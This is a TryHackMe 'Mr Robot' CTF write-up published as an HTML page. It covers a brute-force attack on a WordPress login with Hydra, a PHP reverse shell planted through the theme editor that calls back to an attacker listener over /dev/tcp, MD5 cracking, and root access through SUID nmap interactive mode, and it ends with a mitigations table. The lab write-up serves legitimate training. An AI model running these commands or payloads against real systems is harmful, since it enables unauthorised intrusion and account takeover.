@@ -1,0 +1,165 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Mr Robot CTF — TryHackMe writeup | Farhan Hussain</title>
+<meta name="description" content="robots.txt leaked both key 1 and a custom wordlist. Deduplication shrunk the wordlist from 858K to 11K words before running Hydra in two passes — first…">
+<link rel="canonical" href="https://thecyberfarhan.github.io/writeups/mrrobot.html">
+<meta property="og:title" content="Mr Robot CTF — TryHackMe writeup">
+<meta property="og:description" content="robots.txt leaked both key 1 and a custom wordlist. Deduplication shrunk the wordlist from 858K to 11K words before running Hydra in two passes — first…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://thecyberfarhan.github.io/writeups/mrrobot.html">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23161b22'/%3E%3Crect x='1' y='1' width='30' height='30' rx='6' fill='none' stroke='%23B4232C' stroke-width='2'/%3E%3Ctext x='16' y='22' font-family='Arial' font-size='18' font-weight='700' text-anchor='middle' fill='%23e6edf3'%3EF%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="writeup.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Mr Robot CTF — TryHackMe writeup","description":"robots.txt leaked both key 1 and a custom wordlist. Deduplication shrunk the wordlist from 858K to 11K words before running Hydra in two passes — first…","author":{"@id":"https://thecyberfarhan.github.io/#me"},"datePublished":"2026-06-19","url":"https://thecyberfarhan.github.io/writeups/mrrobot.html","mainEntityOfPage":"https://thecyberfarhan.github.io/writeups/mrrobot.html"}</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <a class="back" href="./">&larr; All writeups</a>
+    <a class="brand" href="https://thecyberfarhan.github.io/">Farhan<span>.</span></a>
+  </div>
+  <p class="eyebrow">TryHackMe writeup</p>
+  <h1>Mr Robot CTF</h1>
+  <div class="meta">
+    <span class="plat">TryHackMe</span>
+    <span class="diff">Medium</span>
+    <span>June 19, 2026</span>
+  </div>
+  <div class="tldr"><b>TL;DR</b><code>robots.txt</code> leaked both key 1 and a custom wordlist. Deduplication shrunk the wordlist from 858K to 11K words before running Hydra in two passes — first for the username (<code>elliot</code>), then the password (<code>ER28-0652</code>). WordPress theme editor replaced <code>archive.php</code> with a bash reverse shell. As <code>daemon</code>, a raw MD5 hash in robot's home cracked to the alphabet. As <code>robot</code>, SUID nmap v3.81's interactive mode spawned root via <code>!sh</code>. </div>
+  <div class="tools"><span class="chip">🔎 RustScan + Nmap</span><span class="chip">🕷 Feroxbuster</span><span class="chip">🐉 Hydra</span><span class="chip">🔓 John the Ripper</span><span class="chip">🌐 WordPress Theme Editor</span><span class="chip">🗺 nmap <code>--interactive</code></span></div>
+  <h2>Introduction</h2>
+<p>Today's target is <strong>Mr Robot CTF</strong> — a box themed around the TV show of the same name, where everything from the wordlist filename to the username is a reference to the series. It earns its medium difficulty honestly: the username isn't guessable without the custom wordlist, the wordlist is enormous without deduplication, and the route to the shell via the WordPress theme editor requires some persistence when the obvious Metasploit path stumbles. The escalation chain is short but elegant — a two-step hop through <code>robot</code> and straight to root via one of the most classic GTFOBins entries that exists: SUID nmap's <code>--interactive</code> mode, a feature removed from nmap years ago but preserved here as a deliberate challenge artefact.</p>
+<h3>Prerequisites</h3>
+<p>Readers are assumed to know:</p>
+<ul><li>How to deduplicate a wordlist with <code>sort</code> and <code>uniq</code></li><li>How to run Hydra in two separate passes — one for usernames, one for passwords</li><li>How WordPress theme file editing gives code execution</li><li>What SUID nmap interactive mode is and why <code>!sh</code> from it spawns a root shell</li></ul>
+<h2>Recon</h2>
+<p class="aside">(~0 mins into the box)</p>
+<h3>Port Scan</h3>
+<pre><code>rustscan -a 10.48.166.199 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV</code></pre>
+<table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.13</td></tr><tr><td>80/tcp</td><td>HTTP</td><td>Apache (WordPress)</td></tr><tr><td>443/tcp</td><td>HTTPS</td><td>Apache (self-signed cert: <code>www.example.com</code>)</td></tr></tbody></table>
+<p>Both ports 80 and 443 serve WordPress. The SSL cert is a generic placeholder — nothing to extract from it.</p>
+<h3>Web Enumeration</h3>
+<p>Feroxbuster confirmed the expected WordPress structure: <code>wp-login.php</code>, <code>xmlrpc.php</code>, <code>wp-content/</code>, and theme assets. One critical discovery:</p>
+<pre><code>200  http://10.48.166.199/robots.txt</code></pre>
+<p class="aside"><code>robots.txt</code> contents:</p>
+<pre><code>User-agent: *
+fsocity.dic
+key-1-of-3.txt</code></pre>
+<p>Both files are listed without <code>Disallow</code> — they're explicitly announced rather than hidden. <code>key-1-of-3.txt</code> is the first flag. <code>fsocity.dic</code> is a 6.9MB custom wordlist.</p>
+<h3>Wordlist Deduplication</h3>
+<p class="aside"><code>fsocity.dic</code> downloaded — checking word count:</p>
+<pre><code>wc -w fsocity.dic
+# 858160</code></pre>
+<p>858,160 words — most of them duplicates. Running Hydra against this raw would take hours unnecessarily.</p>
+<p class="aside">Sorting and deduplicating:</p>
+<pre><code>sort fsocity.dic | uniq -d &gt; fs-list    # repeated words
+sort fsocity.dic | uniq -u &gt;&gt; fs-list   # unique words
+wc -w fs-list
+# 11451</code></pre>
+<p>Down to 11,451 words — a 98.7% reduction. Hydra will now finish in minutes rather than hours.</p>
+<h2>Foothold</h2>
+<p class="aside">(~10 mins into the box)</p>
+<h3>Two-Stage WordPress Brute Force</h3>
+<p>WordPress login error messages distinguish between "invalid username" and "wrong password for this username" — a classic username enumeration vector. This lets us run Hydra in two separate, faster passes rather than a full credential matrix.</p>
+<p><strong>Pass 1 — Username enumeration</strong> (failure string: "Invalid username"):</p>
+<pre><code>hydra -L fs-list -p test 10.48.166.199 \
+  http-post-form \
+  "/wp-login.php:log=^USER^&amp;pwd=^PASS^:F=Invalid username" -t 30</code></pre>
+
+<pre><code>[80][http-post-form] host: 10.48.166.199   login: elliot   password: test
+[80][http-post-form] host: 10.48.166.199   login: Elliot   password: test
+[80][http-post-form] host: 10.48.166.199   login: ELLIOT   password: test</code></pre>
+<p>Username: <code>elliot</code> (all three case variants confirmed — WordPress login is case-insensitive for usernames).</p>
+<p><strong>Pass 2 — Password brute force</strong> (failure string: "The password you entered for the username"):</p>
+<pre><code>hydra -l elliot -P fs-list 10.48.166.199 \
+  http-post-form \
+  "/wp-login.php:log=^USER^&amp;pwd=^PASS^:F=The password you entered for the username" -t 30</code></pre>
+
+<pre><code>[80][http-post-form] host: 10.48.166.199   login: elliot   password: ER28-0652</code></pre>
+<p>Password: <code>ER28-0652</code> — a reference to Elliot Alderson's employee ID from the show.</p>
+<h3>WordPress Theme Editor — Reverse Shell</h3>
+<p>Logged in to the WordPress admin panel. The Theme Editor (<code>Appearance → Editor</code>) allows direct PHP file editing. The target: <code>archive.php</code> in the Twenty Fifteen theme — a file that won't break site functionality if overwritten.</p>
+<p class="aside">Replacing <code>archive.php</code> entirely with a bash reverse shell:</p>
+<pre><code>&lt;?php
+system("bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.134.217/4444 0&gt;&amp;1'");
+?&gt;</code></pre>
+<p class="aside">Triggering the shell by visiting the archive page:</p>
+<pre><code>http://10.48.166.199/?cat=1</code></pre>
+
+<pre><code># listener
+connect to [192.168.134.217] from (UNKNOWN) [10.48.166.199] 51092
+daemon@ip-10-48-166-199:/...twentyfifteen$</code></pre>
+<p>Shell landed as <code>daemon</code>.</p>
+<h3>Full Shell Stabilisation</h3>
+<pre><code>python -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm
+stty rows 40 columns 120</code></pre>
+
+<h2>Shell / Access</h2>
+<p class="aside">(~35 mins into the box)</p>
+<p class="aside">Navigating to robot's home directory:</p>
+<pre><code>ls /home/robot
+# key-2-of-3.txt    password.raw-md5</code></pre>
+<p><code>key-2-of-3.txt</code> is permission-denied for <code>daemon</code>. But <code>password.raw-md5</code> is readable:</p>
+<pre><code>cat /home/robot/password.raw-md5
+# robot:c3fcd3d76192e4007dfb496cca67e13b</code></pre>
+<p>A raw MD5 hash for <code>robot</code>. The filename helpfully tells you the format.</p>
+<h3>Hash Cracking — John (Raw-MD5)</h3>
+<p>John's auto-detection misidentified the format as LM (a Windows hash type) and cracked nothing. Specifying the format explicitly:</p>
+<pre><code>john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code></pre>
+
+<pre><code>abcdefghijklmnopqrstuvwxyz   (robot)</code></pre>
+<p>Password: the entire lowercase alphabet in order. Memorable in theory; terrible in practice.</p>
+<p class="aside">Switching to <code>robot</code>:</p>
+<pre><code>su robot
+# Password: abcdefghijklmnopqrstuvwxyz
+robot@ip-10-48-166-199:~$ cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959</code></pre>
+
+<h2>Escalation</h2>
+<p class="aside">(~40 mins into the box)</p>
+<h3>SUID nmap — Interactive Mode GTFOBins</h3>
+<p class="aside">Finding SUID binaries:</p>
+<pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre>
+<p>The standout entry:</p>
+<pre><code>/usr/local/bin/nmap</code></pre>
+<p><strong>Why is SUID nmap dangerous?</strong> nmap v3.81 (an extremely old version from ~2005) included an <code>--interactive</code> mode that dropped users into a nmap shell. From that shell, <code>!command</code> executed arbitrary OS commands — and since nmap ran as root via SUID, those commands ran as root too. This feature was removed from nmap long before most modern systems shipped, but this box preserves it deliberately as the intended escalation path.</p>
+<pre><code>/usr/local/bin/nmap --interactive</code></pre>
+
+<pre><code>Starting nmap V. 3.81
+Welcome to Interactive Mode -- press h &lt;enter&gt; for help
+nmap&gt; !sh</code></pre>
+
+<pre><code>root@ip-10-48-166-199:~# cat /root/key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4</code></pre>
+
+<h2>The Full Chain</h2>
+<p>The complete attack chain:</p>
+<ol><li><strong><code>robots.txt</code></strong> → key 1 + <code>fsocity.dic</code> wordlist</li><li><strong>Wordlist deduplication</strong> → 858K → 11K words</li><li><strong>Hydra pass 1</strong> (username enum) → <code>elliot</code>; <strong>pass 2</strong> (password) → <code>ER28-0652</code></li><li><strong>WordPress theme editor</strong> → <code>archive.php</code> → bash reverse shell as <code>daemon</code></li><li><strong><code>password.raw-md5</code></strong> → John (Raw-MD5) → <code>abcdefghijklmnopqrstuvwxyz</code></li><li><strong><code>su robot</code></strong> → key 2</li><li><strong>SUID nmap <code>--interactive</code></strong> → <code>!sh</code> → root → key 3</li></ol>
+<h2>Rabbit Holes</h2>
+<h3>WordPress Metasploit <code>wp_crop_rce</code> Failure</h3>
+<p>WPScan flagged CVE-2019-8942 (crop-image RCE) — the same exploit that worked on the Blog box — and Metasploit's <code>wp_crop_rce</code> module was tried first. It failed to produce a session repeatedly without a clear error. *The exact reason was unclear — possibly a WordPress configuration difference or the Bitnami installation layout affecting the image upload path.* The theme editor manual approach worked cleanly where Metasploit didn't.</p>
+<h3>Manual Theme Editor Shell (First Attempt)</h3>
+<p>Before landing on the <code>archive.php</code> approach, the standard <code>functions.php</code> and <code>header.php</code> theme files were tried first. Multiple attempts failed — *likely because the theme was actively serving requests and PHP syntax errors in core template files caused 500 responses before the shell could fire.* Switching to <code>archive.php</code> (a less critical template only loaded on archive pages) and using a clean one-liner rather than the full PentestMonkey shell resolved it.</p>
+<h3>John's Auto-Detection (LM Format)</h3>
+<p>Running <code>john</code> on the raw MD5 hash without specifying a format caused it to detect the hash as LM (Windows LAN Manager) and run the wrong algorithm — producing zero results. Always specify <code>--format=Raw-MD5</code> for plain MD5 hashes in the format <code>hash</code> or <code>username:hash</code>. The filename <code>password.raw-md5</code> was a direct hint about the format that went unread for longer than it should have.</p>
+<h3><code>!/bin/sh</code> vs <code>!sh</code> in nmap Interactive</h3>
+<p>The first attempt typed <code>!/bin/sh</code> inside nmap's interactive mode and received "not found." The correct syntax drops the leading <code>/</code> — <code>!sh</code> works because <code>sh</code> is in the system PATH, while <code>!/bin/sh</code> is treated as the entire command literal including the exclamation mark prefix. A minor but memorable distinction.</p>
+<h2>Mitigations</h2>
+<table><thead><tr><th>Vulnerability</th><th>Severity</th><th>Mitigation</th></tr></thead><tbody><tr><td><code>robots.txt</code> listing sensitive files</td><td class="sev-high">High</td><td><code>robots.txt</code> is public — never list sensitive paths; use proper access controls instead of obscurity</td></tr><tr><td>Custom wordlist (<code>fsocity.dic</code>) served publicly</td><td class="sev-high">High</td><td>Never expose wordlists, dictionaries, or any non-public asset from the webroot</td></tr><tr><td>WordPress login username enumeration</td><td class="sev-medium">Medium</td><td>Disable login error message differentiation (use a plugin like WP Cerber or add a filter to <code>login_errors</code>)</td></tr><tr><td>Weak WordPress password (<code>ER28-0652</code>) brute-forceable from a 11K wordlist</td><td class="sev-high">High</td><td>Use a randomly generated password; enable login attempt limiting</td></tr><tr><td>WordPress Theme Editor enabled for authenticated users</td><td class="sev-critical">Critical</td><td>Disable the theme/plugin editor in <code>wp-config.php</code>: <code>define('DISALLOW_FILE_EDIT', true)</code></td></tr><tr><td>Raw MD5 password hash for system user</td><td class="sev-critical">Critical</td><td>Use properly salted hashes (bcrypt, sha512crypt) for system user passwords</td></tr><tr><td>SUID bit on ancient nmap v3.81 with interactive mode</td><td class="sev-critical">Critical</td><td>Remove SUID from any binary not explicitly requiring it; replace nmap v3.81 with a modern version — interactive mode was removed specifically because of this escalation path</td></tr></tbody></table>
+  <div class="takeaway"><b>Key takeaway</b>Always deduplicate custom wordlists before feeding them to Hydra — 858,160 entries shrunk to 11,451 is a 75× speed improvement for zero information loss. The extra 30 seconds of <code>sort | uniq</code> preprocessing is the difference between a 5-minute brute force and an all-night one.</div>
+  <h2>If I Did It Again</h2>
+<p>Skip Metasploit's <code>wp_crop_rce</code> entirely and go straight to the theme editor — authenticated WordPress code execution via theme file editing is faster, more reliable, and requires no dependencies beyond a text editor and a listener. Also specify <code>--format=Raw-MD5</code> in John immediately rather than letting it auto-detect.</p>
+  <div class="cta-row">
+    <a class="btn primary" href="https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/mrrobot_writeup.md" target="_blank" rel="noopener">Full writeup on GitHub &rarr;</a>
+    <a class="btn" href="./">More writeups</a>
+  </div>
+  <footer>Part of <a href="https://thecyberfarhan.github.io/">thecyberfarhan.github.io</a>. Auto-generated from the <a href="https://github.com/thecyberfarhan/CTF-Writeups">CTF-Writeups</a> repo — edits happen there, not here.</footer>
+</div>
+</body>
+</html>
